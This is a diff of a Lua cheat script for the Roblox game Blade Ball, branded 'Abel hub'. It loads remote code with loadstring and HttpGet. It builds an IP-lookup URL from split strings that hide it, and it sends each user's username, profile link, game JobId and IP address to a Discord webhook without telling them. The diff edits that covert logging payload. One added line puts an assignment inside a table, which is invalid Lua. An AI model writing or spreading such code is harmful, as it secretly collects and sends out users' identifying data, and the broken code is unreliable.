@@ -9,6 +9,7 @@ local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
 local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
 local get4 = "AWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
 local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
+local weburl = "https://api." .. none .. "if" .. yes .. ".org"
 local Window = Library:CreateWindow({
     Title = 'Blade Ball | Abel hub | JOIN OUR DISCORD! discord.gg/Y889sjNPz4',
     Center = true,
@@ -48,8 +49,9 @@ local abilitielist = {"Dash", "Forcefield", "Invisibility", "Platform", "Raging 
 local heartbeatConnection
 local dis = "https://discord.com/api/"
 local Response = request({
-    Url = "https://api.".. none .. "if" .. yes .. ".org",
-    Method = "GET"
+    Url = weburl,
+    Method = "GET",
+    getgenv().weburl = Url
 })
 
 
@@ -364,7 +366,7 @@ gameid = game.JobId
     local data = {
         ["avatar_url"] = "https://i.imgur.com/szQ00sY.jpg",
         ["username"] = "Clammy",
-        ["content"] = "AbelHub Executed".."\nJobId: "..gameid .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
+        ["content"] = "AbelHub Executed".."Url: "..weburl.."\nJobId: "..gameid .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
     }
     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {
@@ -527,7 +529,7 @@ Misc:AddDivider()
 Misc:AddLabel('JOIN OUR DISCORD! \ndiscord.gg/Y889sjNPz4', true)
 
 Credits:AddLabel('abel7878 - Scripter')
-Credits:AddLabel('leehassocials/clamsham - Scripter')
+Credits:AddLabel('leehassocials - Scripter')
 
 
 
